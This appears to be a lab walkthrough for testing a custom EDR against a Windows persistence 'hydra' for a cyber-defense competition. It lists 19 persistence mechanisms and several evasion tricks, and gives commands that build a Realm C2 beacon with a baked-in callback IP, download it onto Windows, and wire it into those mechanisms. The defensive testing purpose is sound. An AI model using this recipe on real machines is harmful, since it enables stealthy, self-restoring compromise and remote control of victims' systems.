# Test: HYDRA — maximum-persistence implant with layered evasion

The capstone stress test: one benign "implant" deployment that plants **19 independent
persistence mechanisms** at once, wrapped in the evasion layers a real red-team hydra uses
(masqueraded names, plausible paths, hidden+system attributes, timestomping, Microsoft
namespace mimicry, and a resurrection pair). The question it answers: **can the EDR find
ALL of them** — and does it catch them again when they re-arm after partial cleanup?

Two run modes:
- **Benign mode (default):** the payload is a `cmd.exe` copy — no Kali box needed, nothing
  beacons. Good for pure discovery testing.
- **Real-implant mode:** every persistence mechanism re-launches the actual Realm C2
  beacon, so hydra survival means continuous C2 — the full CCDC nightmare scenario.

---

## Implant setup — creation to the Windows machine (real-implant mode)

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build BOTH implant builds (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: standard beacon with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
# service build - hydra mechanism #6 runs the implant as a SYSTEM service:
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release --features win_service
cp target/release/imix.exe ~/sideload-lab/imix_svc.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant where the hydra expects it + prep the EDR**
(elevated PowerShell). The hydra's masqueraded payload lives at
`C:\Users\Public\Intel\DriverStore\syshealthmon.exe`; place the real implant there instead
of letting `deploy-hydra.ps1` stage its benign `cmd.exe` copy:
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe   -OutFile C:\Users\Public\sysupd.exe
Invoke-WebRequest http://172.16.69.109:8000/imix_svc.exe -OutFile C:\Users\Public\imix_svc.exe
# masquerade + evasion exactly as the hydra will use it:
New-Item -ItemType Directory -Force C:\Users\Public\Intel\DriverStore | Out-Null
Copy-Item C:\Users\Public\sysupd.exe C:\Users\Public\Intel\DriverStore\syshealthmon.exe
Copy-Item C:\Users\Public\imix_svc.exe C:\Users\Public\Intel\DriverStore\syshealthsvc.exe
attrib +h +s C:\Users\Public\Intel\DriverStore\syshealthmon.exe
# EDR running + fresh persistence baseline (BEFORE deploying the hydra):
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```

**e) Switch deploy-hydra.ps1 to the real implant** — two line edits before running it:
1. Layer 0 (payload staging): replace the `Copy-Item C:\Windows\System32\cmd.exe
   "$deep\syshealthmon.exe"` line with
   `Copy-Item C:\Users\Public\Intel\DriverStore\syshealthmon.exe "$deep\syshealthmon.exe"`
   (the file is already there from step d — the masquerade, hidden attributes and
   timestomping lines stay as-is and now apply to the real beacon).
2. Mechanism #6 (service): change the `sc.exe create SysHealthMon binPath=` argument from
   `$deep\syshealthmon.exe` to `$deep\syshealthsvc.exe` so the service runs the
   `win_service` build.

With those edits, every firing mechanism — Run key at logon, task every 30 min, WMI
re-arm, screensaver timeout, Active Setup per-user logon, sticky-keys at the lock screen —
starts a beacon to `172.16.69.109:8080`. Expected detections stack: every `PERS-*` from
the table below **plus** `NET-BEACON` (one alert per periodic re-launch), and each
tome-tasked launch re-fires `EVT-4688-TEMP` / `PROG-IMPLANT-LAUNCH`.

**Cleanup warning:** in real-implant mode, run `cleanup-hydra.ps1` (WMI sub first!) and
kill resident beacons before re-baselining — `Stop-Process -Name syshealthmon,
syshealthsvc -Force` — or the re-arm will keep relaunching between your cleanup steps.

Full build reference: [`../_common/implant-build.md`](../_common/implant-build.md).

```
implant-max-persistence/
  WALKTHROUGH.md     <- you are here
  deploy-hydra.ps1   plants all 19 mechanisms (elevated PowerShell)
  cleanup-hydra.ps1  removes everything in the correct order + verifies clean
  rearm-test.ps1     helper for the removal drill (re-points the WMI re-arm)
```

**Verified live on this machine (2026-09-08):** deploy → one audit cycle → **17 distinct
PERS-\* rule types fired (18 findings)** → partial-cleanup drill → the WMI subscription
resurrected the autorun → the auditor caught the re-arm (`PERS-RUNKEY` on the recreated
key) → ordered cleanup → clean audit. Two real findings came out of building it: the
auditor's WMI collector silently returned nothing (multi-class Get-CimInstance bug —
fixed), and WMI `CommandLineEventConsumer` runs as LocalSystem so an HKCU re-arm lands in
SYSTEM's hive, not the user's — the hydra therefore re-arms into **HKLM** Run.

---

## The 19 mechanisms and their detections

| # | Mechanism | Location | Expected rule | Sev |
|---|---|---|---|---|
| 1 | Autorun, masqueraded name "OneDriveSync" | HKCU Run | `PERS-RUNKEY` | high |
| 2 | COM hijack shadow | HKCU CLSID InprocServer32 | `PERS-COM` | crit |
| 3 | fodhelper UAC proxy key | HKCU ms-settings | `PERS-UAC-KEY` | crit |
| 4 | Screensaver hijack | HKCU Control Panel\Desktop | `PERS-SCREENSAVER` | high |
| 5 | PowerShell profile backdoor | Documents\WindowsPowerShell | `PERS-PSPROFILE` | high |
| 6 | Service, plausible name "SysHealthMon" | sc create, binPath in \Users\Public | `PERS-SERVICE` + `EVT-7045` | crit |
| 7 | netsh helper DLL (T1546.007) | HKLM SOFTWARE\Microsoft\Netsh | `PERS-NETSH` | crit |
| 8 | AppCertDlls — loads into EVERY process (T1546.009) | HKLM Session Manager\AppCertDlls | `PERS-APPCERT` | crit |
| 9 | Time provider DLL (W32Time loads as SYSTEM) | HKLM W32Time\TimeProviders | `PERS-TIMEPROV` | crit |
| 10 | Print/port monitor DLL (spooler, SYSTEM) (T1547.010) | HKLM Print\Monitors | `PERS-PRINTMON` | crit |
| 11 | Active Setup StubPath — runs per-logon (T1547.014) | HKLM Active Setup\Installed Components | `PERS-ACTIVESETUP` | crit |
| 12 | Winlogon Notify DLL | HKLM Winlogon\Notify | `PERS-WLNOTIFY` | crit |
| 13 | IFEO debugger on sethc.exe (sticky-keys hijack) | HKLM IFEO | `PERS-IFEO` | crit |
| 14 | Scheduled task in a **Microsoft-mimic path** | \Microsoft\Windows\CCDCTelemetry\Health | `PERS-TASK` | high |
| 15 | WMI event subscription (the re-armed) | root\subscription | `PERS-WMI-SUB` | crit |
| 16 | Startup folder item | user Startup | `PERS-STARTUP` | high |
| 17 | Hidden+system payload in a deep plausible path | \Users\Public\Intel\DriverStore | `SIG-*` on scan; `EVT-4688-TEMP` if launched | varies |
| 18 | Payload copy hidden in an NTFS alternate data stream | file:\:$DATA | **filed gap** (no ADS telemetry) | — |
| 19 | BITS job, queued transfer | bitsadmin | `PERS-BITS` | high |

## The evasion layers (why this is hard to eradicate)

1. **Masqueraded names everywhere** — "OneDriveSync", "SysHealthMon", "Intel\DriverStore":
   nothing looks like malware to an analyst sorting by name.
2. **Microsoft namespace mimicry** — the scheduled task lives at
   `\Microsoft\Windows\CCDCTelemetry\Health`, where nobody looks twice.
3. **Hidden + system file attributes** on the payload (`attrib +h +s`).
4. **Timestomping** — payload backdated to 2020.
5. **NTFS ADS hiding** — a second payload copy inside an alternate data stream of a decoy
   file (invisible to directory listings).
6. **The resurrection pair** — the WMI subscription's command re-creates the Run key.
   Delete the Run key alone and it returns; delete the WMI sub alone and the task re-arms
   nothing, but the task itself re-creates the BITS job. Partial cleanup = hydra wins.
7. **Redundancy across privilege levels** — 5 mechanisms need only user rights; even if
   you kill SYSTEM-level access, the HKCU set survives.

## Run it

Benign mode: run as-is. Real-implant mode: complete the setup section above (steps a-e)
first — then the run is identical.

```powershell
cd C:\Users\Administrator\Desktop\CCDC-EDR-SIEM-design\custom-walkthrough\implant-max-persistence
.\deploy-hydra.ps1                    # elevated; ~30s of planting
# wait one audit cycle (<=30s), then force one:
curl.exe -X POST http://127.0.0.1:8420/api/audit
# scoreboard:
..\..\poc-scripts\victim\check-alerts.ps1
```

**Pass criteria:** all expected rules from the table above have ≥1 alert. Count them:

```powershell
(Invoke-RestMethod http://127.0.0.1:8420/api/state).alerts |
  Where-Object { $_.rule -like "PERS-*" } | Group-Object rule | Sort-Object Name
```

Expect **17 PERS-\* rule types** (18 of the 19 rows — #18 ADS is the filed gap; #17 fires
on scan/launch, not as PERS).

## The removal drill (the interesting part)

1. Run `.\cleanup-hydra.ps1` — it removes things in the order that defeats the
   resurrection pair: **WMI sub first, then the task, then everything else.**
2. Then simulate a SLOPPY partial cleanup to test re-arm detection:

```powershell
.\rearm-test.ps1       # re-points the WMI re-arm (process-creation trigger, HKLM target)
# delete only the autorun, like a tired analyst at hour 6 of CCDC:
Remove-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name OneDriveSync
# any process creation within ~30s re-creates the autorun under HKLM Run:
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' | Select OneDriveSync
# and the EDR catches the re-arm: PERS-RUNKEY fires AGAIN on the next audit cycle
```

Two operational realities baked into the drill:
- WMI `CommandLineEventConsumer` runs as **LocalSystem** — an HKCU re-arm would write
  into SYSTEM's hive, so real (and this) hydra re-arms machine-wide via HKLM.
- Perf-counter classes don't emit WMI events; the reliable trigger is process creation
  (`__InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process'`).

The EDR alerting **again** on the resurrected key is the win condition: your detection
survives partial remediation, which is exactly what CCDC red teams force.

## What this test teaches

- **Coverage:** 19 mechanisms, 17 expected rule types — any missing type is a gap to file.
- **Baseline discipline:** the whole detection is diff-vs-T0. If you re-baseline while
  hydra artifacts are present, you go blind — the walkthrough warns before every baseline.
- **Removal order matters:** resurrection defeats naive cleanup; the EDR is your feedback
  loop proving eradication (audit shows zero findings).

## Cleanup

`.\cleanup-hydra.ps1` handles everything (kills the re-armers first), re-baselines, and
verifies a clean audit. Run `check-alerts.ps1` afterwards to confirm no PERS-* re-fires.
